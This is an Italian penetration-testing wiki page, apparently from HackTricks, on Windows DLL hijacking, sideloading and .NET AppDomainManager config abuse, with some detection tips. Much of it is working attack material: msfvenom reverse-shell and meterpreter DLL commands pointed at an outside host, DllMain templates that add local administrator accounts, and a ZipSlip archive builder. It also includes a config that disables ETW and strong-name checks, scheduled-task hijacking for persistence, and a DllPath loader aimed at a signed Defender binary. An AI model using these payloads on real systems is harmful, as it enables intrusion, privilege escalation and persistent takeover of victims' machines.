# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

Il DLL Hijacking consiste nel manipolare un'applicazione attendibile affinché carichi una DLL malevola. Questo termine comprende diverse tattiche, come **DLL Spoofing, Injection e Side-Loading**. Viene utilizzato principalmente per eseguire codice e ottenere persistenza e, meno frequentemente, per l'escalation dei privilegi. Anche se qui l'attenzione è rivolta all'escalation, il metodo di hijacking rimane lo stesso a prescindere dall'obiettivo.

### Tecniche comuni

Per il DLL hijacking si utilizzano diversi metodi, ciascuno con un'efficacia che dipende dalla strategia di caricamento delle DLL dell'applicazione:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: sostituire una DLL legittima con una malevola, eventualmente usando DLL Proxying per preservare le funzionalità della DLL originale.
2. **DLL Search Order Hijacking**: inserire la DLL malevola in un percorso di ricerca precedente a quello della DLL legittima, sfruttando l'ordine di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: creare una DLL malevola che l'applicazione caricherà, credendo che sia una DLL richiesta ma inesistente.
4. **DLL Redirection**: modificare parametri di ricerca come `%PATH%` o file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione alla DLL malevola.
5. **WinSxS DLL Replacement**: sostituire la DLL legittima con una controparte malevola nella directory WinSxS, un metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: inserire la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, in modo simile alle tecniche di Binary Proxy Execution.

Un'applicazione può anche implementare un **proprio loader per DLL**. Un processo privilegiato potrebbe enumerare una directory figlia, ad esempio `Libraries` o `Plugins`, e passare una DLL selezionata a un helper, indipendentemente dal normale ordine di ricerca delle DLL di Windows. Se un altro account può creare file proprio in quella directory, consideralo un indizio da verificare: conferma l'identità del processo, le ACL effettive della directory, la regola di selezione dei file e la possibilità di raggiungere il caricamento. Il fatto che una directory accanto a un eseguibile sia scrivibile non dimostra che il processo carichi DLL da lì.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Il classico DLL sideloading non è l'unico modo per indurre un processo attendibile **.NET Framework** a caricare codice controllato da un utente malintenzionato. Se l'eseguibile di destinazione è un'applicazione **managed**, il CLR consulta anche un **file di configurazione dell'applicazione** che prende il nome dall'eseguibile (ad esempio `Setup.exe.config`). Questo file può definire un **AppDomainManager** personalizzato. Se la configurazione fa riferimento a un assembly controllato dall'utente malintenzionato e collocato accanto all'EXE, il CLR lo carica **prima del normale percorso di esecuzione dell'applicazione** e lo esegue all'interno del processo attendibile.<sup>[[24]](#references)</sup>

Secondo lo schema di configurazione .NET Framework di Microsoft, per usare il manager personalizzato devono essere presenti sia `<appDomainManagerAssembly>` sia `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Configurazione minima:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Gestore minimale:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Note pratiche:
- Questa tecnica operativa è **specifica di .NET Framework**. Dipende dal parsing della configurazione del CLR, non dall’ordine di ricerca delle DLL di Win32.
- L’host deve essere effettivamente un **EXE gestito**. Verifica rapida: `sigcheck -m target.exe`, `corflags target.exe` oppure controlla la presenza del **CLR Runtime Header** nei metadati PE.
- Il nome del file di configurazione deve corrispondere esattamente a quello dell’eseguibile (`<binary>.config`) e di solito si trova **accanto all’EXE**.
- È utile con **binari Microsoft/vendor firmati**, perché l’EXE attendibile rimane intatto mentre l’assembly gestito malevolo viene eseguito in-process.
- Se hai già una directory di installazione/aggiornamento scrivibile, l’AppDomainManager hijacking può essere usato come **primo stadio**, seguito dal classico DLL sideloading o dal caricamento riflessivo per gli stadi successivi.

### AppDomainManager come downloader + bootstrap per un’attività pianificata

Un modello d’intrusione pratico consiste nell’abbinare l’EXE gestito attendibile a un `*.config` malevolo e a una DLL AppDomainManager malevola che funge solo da **piccolo bootstrapper**:<sup>[[25]](#references)</sup>

1. L’utente avvia un installer o updater .NET firmato da una posizione credibile, come `%USERPROFILE%\Downloads`.
2. Il file di configurazione adiacente induce il CLR a caricare l’assembly dell’attaccante **prima** che inizi la logica dell’app legittima.
3. Il manager malevolo esegue un **path gate** (ad esempio, prosegue solo se l’EXE host è in esecuzione da `Downloads` e consente l’esecuzione del secondo stadio solo da `%LOCALAPPDATA%`).
4. Se il controllo viene superato, scarica il payload effettivo in un percorso scrivibile dall’utente, come `%LOCALAPPDATA%\PerfWatson2.exe`, e installa la persistenza con un’attività pianificata.

Perché questa variante è importante:
- L’EXE host firmato rimane invariato, quindi un triage che calcola l’hash solo del binario principale potrebbe non rilevare la compromissione.
- La semplice **anti-analisi basata sul percorso** è comune: spostare la triade ZIP/EXE/DLL sul Desktop, in Temp o in un percorso sandbox può interrompere intenzionalmente la catena.
- La DLL AppDomainManager del primo stadio può rimanere piccola e poco rumorosa, mentre l’impianto effettivo viene scaricato in seguito.

Esempio minimo di persistenza spesso usato con questo modello:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Note:
- ` /rl highest` significa **il livello più alto disponibile** per quell'utente/sessione; da solo non garantisce un'escalation a SYSTEM.
- Questa tecnica è spesso più correttamente classificata come **esecuzione/persistenza tramite abuso della configurazione .NET** che come classico hijacking dell'ordine di ricerca di DLL mancanti, anche se gli operatori spesso concatenano entrambe.

Indicatori per il rilevamento:
- Eseguibili .NET firmati avviati da percorsi di estrazione di **ZIP**, `Downloads`, `%TEMP%` o altre cartelle scrivibili dall'utente, con un file `<exe>.config` **nella stessa directory**.
- Nuove attività pianificate la cui azione punta a `%LOCALAPPDATA%`, `%APPDATA%` o `Downloads` e i cui nomi imitano gli updater di browser o vendor.
- Processi bootstrap gestiti di breve durata che scaricano immediatamente un altro EXE e poi avviano `schtasks.exe`.
- Campioni che terminano anticipatamente se il percorso dell'eseguibile non corrisponde a una directory attesa nel profilo utente.

### Hijacking di un'attività pianificata esistente per riavviare la catena di sideload

Per la persistenza, non cercare solo la **creazione di una nuova attività**. Alcuni gruppi di intrusione aspettano che un installer legittimo crei una **normale attività di aggiornamento**, poi **riscrivono l'azione dell'attività** affinché il nome, l'autore e il trigger esistenti rimangano familiari ai difensori.

Workflow riutilizzabile:
1. Installa/avvia il software legittimo e identifica l'attività che crea normalmente.
2. Esporta l'XML dell'attività e annota i valori correnti di `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Sostituisci solo l'azione affinché l'attività avvii il tuo **EXE host attendibile** da una directory di staging scrivibile dall'utente, che poi esegue il side-load o carica il payload reale tramite AppDomain.
4. Registra nuovamente lo stesso nome dell'attività invece di creare un nuovo artefatto di persistenza evidente.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Perché è più stealth:
- Il nome dell'attività può sembrare legittimo (per esempio, quello di un updater di un vendor).
- La avvia il **servizio Task Scheduler**, quindi la convalida del processo padre o degli antenati spesso rileva la catena di avvio prevista invece di `explorer.exe`.
- I team DFIR che cercano solo **nuovi nomi di attività** potrebbero non individuare un'attività già registrata, ma la cui azione ora punta a `%LOCALAPPDATA%`, `%APPDATA%` o a un altro percorso controllato dall'attaccante.

Pivot rapidi per l'hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Confronta i file XML in `C:\Windows\System32\Tasks\*` e i metadati in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` con una baseline.
- Genera un alert quando un'**attività updater che sembra appartenere a un vendor** viene eseguita da **directory scrivibili dall'utente** o avvia un file EXE .NET con un file `*.config` nella stessa directory.

> [!TIP]
> Per una catena dettagliata che combina HTML staging, configurazioni AES-CTR e impianti .NET con il DLL sideloading, consulta il workflow seguente.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Individuare le DLL mancanti

Il modo più comune per trovare DLL mancanti in un sistema consiste nell'eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) di sysinternals, **impostando i 2 filtri seguenti**:

![Tecniche comuni - Individuare le DLL mancanti: il modo più comune per trovare DLL mancanti in un sistema consiste nell'eseguire procmon di sysinternals, impostando i 2 filtri seguenti](<../../../images/image (961).png>)

![Tecniche comuni - Individuare le DLL mancanti: il modo più comune per trovare DLL mancanti in un sistema consiste nell'eseguire procmon di sysinternals, impostando i 2 filtri seguenti](<../../../images/image (230).png>)

e visualizzare solo la **File System Activity**:

![Tecniche comuni - Individuare le DLL mancanti: e visualizzare solo la File System Activity](<../../../images/image (153).png>)

Se cerchi **DLL mancanti in generale**, lascia il programma in esecuzione per alcuni **secondi**.\
Se cerchi una **DLL mancante all'interno di un eseguibile specifico**, imposta un altro filtro, ad esempio **"Process Name" "contains" `<exec name>`**, eseguilo e interrompi l'acquisizione degli eventi.<sup>[[9]](#references)</sup>

## Sfruttare le DLL mancanti

Per elevare i privilegi, cerca una **DLL che un processo privilegiato tenta di caricare** da una posizione in cui puoi scrivere. Questo può accadere quando controlli una directory cercata prima di quella contenente la DLL legittima, oppure quando la DLL richiesta non esiste e puoi scrivere in una delle directory cercate.

### Ordine di ricerca delle DLL

**Nella** [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare informazioni su come vengono caricate le DLL.**

Le **applicazioni Windows** cercano le DLL seguendo un insieme di **percorsi di ricerca predefiniti** e rispettando una sequenza specifica. Il DLL hijacking si verifica quando una DLL dannosa viene collocata strategicamente in una di queste directory, in modo da essere caricata prima della DLL autentica. Per prevenirlo, l'applicazione dovrebbe usare percorsi assoluti per fare riferimento alle DLL necessarie.

Di seguito puoi vedere l'**ordine di ricerca delle DLL nei sistemi a 32 bit**:

1. La directory da cui è stata caricata l'applicazione.
2. La directory di sistema. Usa la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il percorso di questa directory.(_C:\Windows\System32_)
3. La directory di sistema a 16 bit. Non esiste una funzione che restituisca il percorso di questa directory, ma viene comunque cercata. (_C:\Windows\System_)
4. La directory di Windows. Usa la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il percorso di questa directory.
   1. (_C:\Windows_)
5. La directory corrente.
6. Le directory elencate nella variabile d'ambiente PATH. Nota che questo non include il percorso specifico dell'applicazione definito dalla chiave di registro **App Paths**. La chiave **App Paths** non viene usata per determinare il percorso di ricerca delle DLL.

Questo è l'ordine di ricerca **predefinito** con **SafeDllSearchMode** abilitato. Se è disabilitato, la directory corrente sale al secondo posto. Per disabilitare questa funzionalità, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo su 0 (per impostazione predefinita è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH**, la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, una DLL può essere caricata usando il percorso assoluto anziché il nome. In tal caso, Windows cerca la DLL solo nel percorso specificato; le dipendenze richieste per nome seguono comunque l'ordine di ricerca applicabile.

Esistono altri modi per modificare l'ordine di ricerca, ma non li spiegherò qui.

### Concatenare una scrittura arbitraria di file a un hijack di una DLL mancante

**Tecnica correlata:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Usa i filtri di **ProcMon** (`Process Name` = EXE target, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) per raccogliere i nomi delle DLL che il processo cerca ma non trova.<sup>[[14]](#references)</sup>
2. Se il binario viene eseguito **a intervalli pianificati o come servizio**, posizionare una DLL con uno di quei nomi nella **directory dell'applicazione** (voce n. 1 nell'ordine di ricerca) farà sì che venga caricata all'esecuzione successiva. In un caso relativo a uno scanner .NET, il processo cercava `hostfxr.dll` in `C:\samples\app\` prima di caricare la copia legittima da `C:\Program Files\dotnet\fxr\...`.
3. Crea una DLL payload (ad es. una reverse shell) con qualsiasi export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se la tua primitiva è una **scrittura arbitraria in stile ZipSlip**, crea uno ZIP con una voce che esca dalla directory di estrazione, in modo da posizionare la DLL nella directory dell'app:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Consegna l’archivio alla inbox/share monitorata; quando l’attività pianificata riavvia il processo, questo carica la DLL malevola ed esegue il tuo codice con l’account di servizio.

### Forzare il sideloading tramite RTL_USER_PROCESS_PARAMETERS.DllPath

Un metodo avanzato per influenzare in modo deterministico il percorso di ricerca delle DLL di un processo appena creato consiste nell’impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il processo con le API native di ntdll. Specificando una directory controllata dall’attaccante, si può forzare un processo target che risolve una DLL importata tramite nome (senza percorso assoluto e senza usare i flag di caricamento sicuro) a caricare una DLL malevola da quella directory.

Idea chiave
- Crea i parametri del processo con RtlCreateProcessParametersEx e specifica un DllPath personalizzato che punti alla tua cartella controllata (ad es., la directory in cui si trova il tuo dropper/unpacker).
- Crea il processo con RtlCreateUserProcess. Quando il binario target risolve una DLL tramite nome, il loader consulta il DllPath specificato durante la risoluzione, consentendo un sideloading affidabile anche quando la DLL malevola non si trova nella stessa directory dell’EXE target.

Note/limitazioni
- Questo influisce sul processo figlio in fase di creazione; è diverso da SetDllDirectory, che influisce solo sul processo corrente.
- Il target deve importare una DLL o chiamare LoadLibrary specificandone il nome (senza percorso assoluto e senza usare LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e i percorsi assoluti hardcoded non possono essere hijacked. Gli export forwarded e SxS possono modificare la precedenza.

Esempio minimo in C (ntdll, stringhe wide, gestione semplificata degli errori):

<details>
<summary>Esempio completo in C: forzare il sideloading delle DLL tramite RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Esempio pratico di utilizzo
- Inserisci una xmllite.dll malevola (che esporti le funzioni richieste o faccia da proxy per quella legittima) nella directory DllPath.
- Avvia un binario firmato noto per cercare xmllite.dll per nome usando la tecnica descritta sopra. Il loader risolve l’import tramite il DllPath fornito e carica lateralmente la tua DLL.

Questa tecnica è stata osservata in attacchi reali per orchestrare catene di sideloading a più fasi: un launcher iniziale deposita una DLL helper, che avvia un binario firmato da Microsoft e vulnerabile all’hijacking, con un DllPath personalizzato per forzare il caricamento della DLL dell’attaccante da una directory di staging.<sup>[[6]](#references)</sup>


### Hijacking di AppDomainManager tramite `.exe.config`

Per le applicazioni **.NET Framework**, il sideloading può avvenire **prima di `Main()`** senza modificare la memoria, sfruttando il file **`.exe.config`** adiacente all’applicazione. Invece di affidarsi soltanto all’ordine di ricerca delle DLL Win32, l’attaccante colloca un EXE .NET legittimo accanto a un file di configurazione malevolo e a uno o più assembly controllati dall’attaccante.

Come funziona la catena:<sup>[[15]](#references)[[22]](#references)</sup>
1. L’EXE host si avvia e il **CLR legge `<exe>.config`**.
2. Il file di configurazione imposta **`<appDomainManagerAssembly>`** e **`<appDomainManagerType>`**, così che il runtime istanzi un `AppDomainManager` controllato dall’attaccante.
3. Il manager malevolo ottiene **l’esecuzione prima di `Main()`** all’interno del processo host attendibile.
4. Lo stesso file di configurazione può forzare il CLR a risolvere prima gli assembly locali (ad esempio `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) e indebolire la convalida del runtime o la telemetria senza patching inline.

Schema tipico delle campagne (la struttura esatta può variare in base alla direttiva e alla versione del CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Perché è utile:
- **`<probing privatePath="."/>`** mantiene la risoluzione degli assembly nella directory dell’applicazione, trasformando la cartella in una superficie di sideloading prevedibile.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** spostano l’esecuzione nel codice dell’attaccante durante l’inizializzazione del CLR, prima che venga eseguita la logica legittima dell’app.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** può consentire a un’app con attendibilità completa di caricare assembly non firmati o manomessi senza errori di convalida dello strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** evita i reindirizzamenti della publisher policy verso assembly più recenti.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** rende più deterministica la selezione del runtime.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** è particolarmente interessante perché il **CLR disabilita la propria visibilità ETW** tramite la configurazione, invece di modificare in memoria `EtwEventWrite` con l’impianto.

Schema operativo osservato nelle campagne recenti:
- Fase 1: rilascia `setup.exe`, `setup.exe.config` e assembly locali.
- Fase 2: li copia in una cartella **AppData update** credibile, rinomina l’host con un nome come `update.exe` e lo riavvia tramite un’**attività pianificata**.
- Fase 3: verifica il contesto di esecuzione (ad esempio, che il processo padre atteso sia `svchost.exe` avviato da Task Scheduler) prima di caricare la DLL/export finale del RAT.

Idee per la ricerca di indicatori:
- **Eseguibili .NET** firmati o altrimenti legittimi, avviati con file **`.config`** adiacenti sospetti in percorsi scrivibili dagli utenti.
- File `.config` contenenti **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** o **`etwEnable enabled="false"`**.
- Attività pianificate che riavviano binari di aggiornamento rinominati da **`%LOCALAPPDATA%`** o da directory specifiche dell’app, come `\bin\update\`.
- Catene di processi padre/figlio in cui un’attività pianificata avvia un host .NET attendibile che carica subito assembly non del fornitore dalla propria directory.

#### Eccezioni all’ordine di ricerca delle DLL nella documentazione di Windows

La documentazione di Windows indica alcune eccezioni all’ordine di ricerca standard delle DLL:

- Quando viene individuata una **DLL con lo stesso nome di una già caricata in memoria**, il sistema non segue la normale procedura di ricerca. Controlla invece eventuali reindirizzamenti e un manifest, prima di ricorrere alla DLL già presente in memoria. **In questo scenario, il sistema non cerca la DLL**.
- Se la DLL è riconosciuta come **DLL nota** per la versione corrente di Windows, il sistema utilizza la propria versione della DLL nota e tutte le relative DLL dipendenti, **saltando la procedura di ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene l’elenco di queste DLL note.
- Se una **DLL ha dipendenze**, la ricerca delle DLL dipendenti avviene come se fossero indicate solo tramite i rispettivi **nomi di modulo**, indipendentemente dal fatto che la DLL iniziale sia stata individuata tramite un percorso completo.

### Escalation dei privilegi

**Requisiti**:

- Individuare un processo che opera o opererà con **privilegi diversi** (movimento orizzontale o laterale) e a cui **manca una DLL**.
- Assicurarsi di avere **accesso in scrittura** a una **directory** in cui verrà cercata la **DLL**. Può essere la directory dell’eseguibile oppure una directory inclusa nel percorso di sistema.

Questi prerequisiti sono rari per impostazione predefinita: gli eseguibili privilegiati di solito non hanno dipendenze DLL mancanti e gli utenti standard normalmente non possono scrivere nelle directory del percorso di ricerca di sistema. Tuttavia, gli ambienti configurati in modo errato possono presentare entrambe le condizioni.\
Se i requisiti sono soddisfatti, consulta il progetto [UACME](https://github.com/hfiref0x/UACME). Anche se il suo obiettivo principale è il bypass di UAC, include PoC di DLL hijacking per versioni specifiche di Windows, spesso adattabili alla directory scrivibile individuata.

Nota che puoi **verificare i tuoi permessi in una cartella** con:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

E **controlla i permessi di tutte le cartelle all'interno di PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Puoi anche controllare le importazioni di un eseguibile e le esportazioni di una DLL con:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Per una guida completa su come **abusare di DLL Hijacking per ottenere un'escalation dei privilegi** disponendo dei permessi di scrittura in una **cartella System Path**, consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatizzati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verifica se hai i permessi di scrittura su una qualsiasi cartella all'interno del system PATH.\
Altri interessanti strumenti automatizzati per individuare questa vulnerabilità sono le funzioni di **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Esempio

Se trovi uno scenario sfruttabile, uno degli aspetti più importanti per riuscire a sfruttarlo è **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. In ogni caso, ricorda che DLL Hijacking è utile per [**passare da un livello di integrità Medium a High (bypassando UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) oppure da[ **High Integrity a SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una dll valida** in questo studio sul DLL Hijacking, incentrato sull'esecuzione tramite DLL hijacking: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiva** trovi alcuni **codici dll di base** che possono essere utili come **template** o per creare una **dll con funzioni non richieste esportate**.

## **Creazione e compilazione di DLL**

### **DLL Proxifying**

In pratica, una **DLL proxy** è una DLL in grado di **eseguire il tuo codice malevolo quando viene caricata**, ma anche di **esporre** le funzioni e **comportarsi** come **previsto**, **inoltrando tutte le chiamate alla libreria reale**.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi **indicare un eseguibile e selezionare la libreria** di cui vuoi creare una proxy, quindi **generare una dll proxificata**, oppure **indicare la DLL** e **generare una dll proxificata**.

### **Meterpreter**

**Ottieni una rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Ottieni un meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Crea un utente (x86, non ho visto una versione x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### La tua

In molti casi, la DLL che compili deve **esportare ogni funzione importata dal processo vittima**. Se manca un'esportazione necessaria, il binario non può risolverla e l'exploit fallisce.

<details>
<summary>Template DLL in C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Esempio di DLL in C++ con creazione di un utente</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL C alternativa con entry point del thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Caso di studio: hijack della DLL di localizzazione TTS OneCore di Narrator (accessibilità/AT)

Windows Narrator.exe continua a cercare all'avvio una DLL di localizzazione prevedibile e specifica per lingua, che può essere hijackata per eseguire codice arbitrario e garantire persistenza.<sup>[[7]](#references)</sup>

Fatti principali
- Percorso di ricerca (build attuali): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Percorso legacy (build precedenti): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
